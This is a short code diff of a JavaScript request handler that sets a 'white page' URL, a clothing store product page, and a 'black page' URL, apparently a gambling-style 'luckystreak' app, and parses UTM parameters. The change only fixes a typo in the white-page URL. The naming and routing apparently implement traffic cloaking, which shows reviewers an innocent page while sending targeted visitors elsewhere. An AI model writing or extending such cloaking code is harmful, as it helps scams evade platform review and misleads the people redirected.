@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://https://zeenwoman.com/collections/winter-collection/products/stitched-2-piece-embroidered-both-side-slub-suit-wam24636-black?variant=44557897367692";
+    const whitePageURL = "https://zeenwoman.com/collections/winter-collection/products/stitched-2-piece-embroidered-both-side-slub-suit-wam24636-black?variant=44557897367692";
     const blackPageURL = "https://luckystreak.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
